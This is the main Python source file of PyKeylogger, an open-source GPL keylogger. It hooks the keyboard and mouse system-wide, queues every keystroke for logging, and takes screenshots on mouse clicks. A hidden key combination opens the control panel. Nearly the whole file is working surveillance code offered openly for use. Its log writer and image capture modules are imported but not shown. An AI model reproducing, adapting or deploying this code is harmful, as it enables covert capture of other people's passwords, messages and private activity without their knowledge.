##############################################################################
##
## PyKeylogger: Simple Python Keylogger for Windows
## Copyright (C) 2007  nanotube@users.sf.net
##
## http://pykeylogger.sourceforge.net/
##
## This program is free software; you can redistribute it and/or
## modify it under the terms of the GNU General Public License
## as published by the Free Software Foundation; either version 3
## of the License, or (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##
##############################################################################

import os
import time
import sys
if os.name == 'posix':
    import pyxhook as hooklib
elif os.name == 'nt':
    import pyHook as hooklib
    import pythoncom
else:
    print "OS is not recognised as windows or linux."
    exit()

import imp # don't need this anymore?
from optparse import OptionParser
import traceback
from logwriter import LogWriter
from imagecapture import ImageWriter
import version
#import ConfigParser
from configobj import ConfigObj
from validate import Validator
from controlpanel import PyKeyloggerControlPanel
from supportscreen import SupportScreen, ExpirationScreen
import Tkinter, tkMessageBox
import myutils
import Queue
import threading

class KeyLogger:
    ''' Captures all keystrokes, puts events in Queue for later processing
    by the LogWriter class
    '''
    def __init__(self): 
        
        self.ParseOptions()
        self.ParseConfigFile()
        self.ParseControlKey()
        self.NagscreenLogic()
        self.q_logwriter = Queue.Queue(0)
        self.q_imagewriter = Queue.Queue(0)
        self.lw = LogWriter(self.settings, self.cmdoptions, self.q_logwriter)
        self.iw = ImageWriter(self.settings, self.cmdoptions, self.q_imagewriter)
        self.hashchecker = ControlKeyMonitor(self.cmdoptions, self.lw, self, self.ControlKeyHash)
        
        self.hm = hooklib.HookManager()
        
        if self.settings['General']['Hook Keyboard'] == True:
            self.hm.HookKeyboard()
            self.hm.KeyDown = self.OnKeyDownEvent
            self.hm.KeyUp = self.OnKeyUpEvent
        
        if self.settings['Image Capture']['Capture Clicks'] == True:
            self.hm.HookMouse()
            self.hm.MouseAllButtonsDown = self.OnMouseDownEvent
            #self.hm.MouseAllButtonsDown = lambda x: True # do nothing
            
        #~ elif os.name == 'posix':
            #~ self.hm = pyxhook.pyxhook(captureclicks = self.settings['Image Capture']['Capture Clicks'], clickimagedimensions = {"width":self.settings['Image Capture']['Capture Clicks Width'], "height":self.settings['Image Capture']['Capture Clicks Height']}, logdir = self.settings['General']['Log Directory'], KeyDown = self.OnKeyDownEvent, KeyUp = self.OnKeyUpEvent)
        
        #if self.options.hookMouse == True:
        #   self.hm.HookMouse()

    def start(self):
        self.lw.start()
        self.iw.start()
        if os.name == 'nt':
            pythoncom.PumpMessages()
        if os.name == 'posix':
            self.hm.start()
            
        self.hashchecker.start()
           
    def ParseControlKey(self):
        self.ControlKeyHash = ControlKeyHash(self.settings['General']['Control Key'])
        
    def OnKeyDownEvent(self, event):
        '''This function is the stuff that's supposed to happen when a key is pressed.
        Puts the event in queue, 
        Updates the control key combo status,
        And passes the event on to the system.
        '''
        
        self.q_logwriter.put(event)
        
        self.ControlKeyHash.update(event)
        
        if self.cmdoptions.debug:
                self.lw.PrintDebug("control key status: " + str(self.ControlKeyHash))
            
        return True
    
    def OnKeyUpEvent(self,event):
        self.ControlKeyHash.update(event)
        return True
    
    def OnMouseDownEvent(self,event):
        self.q_imagewriter.put(event)
        return True
    
    def stop(self):
        '''Exit cleanly.
        '''
        
        if os.name == 'posix':
            self.hm.cancel()
        self.lw.cancel()
        self.iw.cancel()
        self.hashchecker.cancel()
        #print threading.enumerate()
        sys.exit()
    
    def ParseOptions(self):
        '''Read command line options
        '''
        parser = OptionParser(version=version.description + " version " + version.version + " (" + version.url + ").")
        parser.add_option("-d", "--debug", action="store_true", dest="debug", help="debug mode (print output to console instead of the log file) [default: %default]")
        parser.add_option("-c", "--configfile", action="store", dest="configfile", help="filename of the configuration ini file. [default: %default]")
        parser.add_option("-v", "--configval", action="store", dest="configval", help="filename of the configuration validation file. [default: %default]")
        
        parser.set_defaults(debug=False, 
                            configfile="pykeylogger.ini", 
                            configval="pykeylogger.val")
        
        (self.cmdoptions, args) = parser.parse_args()
    
    def ParseConfigFile(self):
        '''Read config file options from .ini file.
        Filename as specified by "--configfile" option, default "pykeylogger.ini".
        Validation file specified by "--configval" option, default "pykeylogger.val".
        
        Give detailed error box and exit if validation on the config file fails.
        '''

        self.settings=ConfigObj(self.cmdoptions.configfile, configspec=self.cmdoptions.configval, list_values=False)

        # validate the config file
        errortext="Some of your input contains errors. Detailed error output below.\n\n"
        val = Validator()
        valresult = self.settings.validate(val, preserve_errors=True)
        if valresult != True:
            for section in valresult.keys():
                if valresult[section] != True:
                    sectionval = valresult[section]
                    for key in sectionval.keys():
                        if sectionval[key] != True:
                            errortext += "Error in item \"" + str(key) + "\": " + str(sectionval[key]) + "\n"
            tkMessageBox.showerror("Errors in config file. Exiting.", errortext)
            sys.exit()
        
    def NagscreenLogic(self):
        '''Figure out whether the nagscreen should be shown, and if so, show it.
        '''
        
        # Congratulations, you have found the nag control. See, that wasn't so hard, was it? :)
        # 
        # While I have deliberately made it easy to stop all this nagging and expiration stuff here,
        # and you are quite entitled to doing just that, I would like to take this final moment 
        # and encourage you once more to support the PyKeylogger project by making a donation. 
        
        # Set this to False to get rid of all nagging.
        NagMe = False
        
        if NagMe == True:
            # first, show the support screen
            root=Tkinter.Tk()
            root.geometry("100x100+200+200")
            warn=SupportScreen(root, title="Please Support PyKeylogger", rootx_offset=-20, rooty_offset=-35)
            root.destroy()
            del(warn)
            
            #set the timer if first use
            if myutils.password_recover(self.settings['General']['Usage Time Flag NoDisplay']) == "firstuse":
                self.settings['General']['Usage Time Flag NoDisplay'] = myutils.password_obfuscate(str(time.time()))
                self.settings.write()
            
            # then, see if we have "expired"
            if abs(time.time() - float(myutils.password_recover(self.settings['General']['Usage Time Flag NoDisplay']))) > 345600: #4 days
                root = Tkinter.Tk()
                root.geometry("100x100+200+200")
                warn=ExpirationScreen(root, title="PyKeylogger Has Expired", rootx_offset=-20, rooty_offset=-35)
                root.destroy()
                del(warn)
                sys.exit()

class ControlKeyHash:
    '''Encapsulates the control key dictionary which is used to keep
    track of whether the control key combo has been pressed.
    '''
    def __init__(self, controlkeysetting):
        
        #~ lin_win_dict = {'Alt_L':'Lmenu',
                                    #~ 'Alt_R':'Rmenu',
                                    #~ 'Control_L':'Lcontrol',
                                    #~ 'Control_R':'Rcontrol',
                                    #~ 'Shift_L':'Lshift',
                                    #~ 'Shift_R':'Rshift',
                                    #~ 'Super_L':'Lwin',
                                    #~ 'Super_R':'Rwin'}
        
        lin_win_dict = {'Alt_l':'Lmenu',
                                    'Alt_r':'Rmenu',
                                    'Control_l':'Lcontrol',
                                    'Control_r':'Rcontrol',
                                    'Shift_l':'Lshift',
                                    'Shift_r':'Rshift',
                                    'Super_l':'Lwin',
                                    'Super_r':'Rwin',
                                    'Page_up':'Prior'}
                                    
        win_lin_dict = dict([(v,k) for (k,v) in lin_win_dict.iteritems()])
        
        self.controlKeyList = controlkeysetting.split(';')
        
        # capitalize all items for greater tolerance of variant user inputs
        self.controlKeyList = [item.capitalize() for item in self.controlKeyList]
        # remove duplicates
        self.controlKeyList = list(set(self.controlKeyList))
        
        # translate linux versions of key names to windows, or vice versa,
        # depending on what platform we are on.
        if os.name == 'nt':
            for item in self.controlKeyList:
                if item in lin_win_dict.keys():
                    self.controlKeyList[self.controlKeyList.index(item)] = lin_win_dict[item]
        elif os.name == 'posix':
            for item in self.controlKeyList:
                if item in win_lin_dict.keys():
                    self.controlKeyList[self.controlKeyList.index(item)] = lin_win_dict[item]
        
        self.controlKeyHash = dict(zip(self.controlKeyList, [False for item in self.controlKeyList]))
    
    def update(self, event):
        if event.MessageName == 'key down' and event.Key.capitalize() in self.controlKeyHash.keys():
            self.controlKeyHash[event.Key.capitalize()] = True
        if event.MessageName == 'key up' and event.Key.capitalize() in self.controlKeyHash.keys():
            self.controlKeyHash[event.Key.capitalize()] = False
    
    def reset(self):
        for key in self.controlKeyHash.keys():
            self.controlKeyHash[key] = False
    
    def check(self):
        if self.controlKeyHash.values() == [True for item in self.controlKeyHash.keys()]:
            return True
        else:
            return False
            
    def __str__(self):
        return str(self.controlKeyHash)

class ControlKeyMonitor(threading.Thread):
    '''Polls the control key hash status periodically, to see if
    the control key combo has been pressed. Brings up control panel if it has.
    '''
    def __init__(self, cmdoptions, logwriter, mainapp, controlkeyhash):
        threading.Thread.__init__(self)
        self.finished = threading.Event()
        
        # panel flag - true if panel is up, false if not
        # this way we don't start a second panel instance when it's already up
        self.panel=False
        
        self.lw = logwriter
        self.mainapp = mainapp
        self.cmdoptions = cmdoptions
        self.ControlKeyHash = controlkeyhash
        
    def run(self):
        while not self.finished.isSet():
            if self.ControlKeyHash.check():
                if not self.panel:
                    self.lw.PrintDebug("starting panel")
                    self.panel = True
                    self.ControlKeyHash.reset()
                    PyKeyloggerControlPanel(self.cmdoptions, self.mainapp)
            time.sleep(0.05)
        
    def cancel(self):
        self.finished.set()
        

if __name__ == '__main__':
    
    kl = KeyLogger()
    kl.start()
        
    #if you want to change keylogger behavior from defaults, modify the .ini file. Also try '-h' for list of command line options.
    
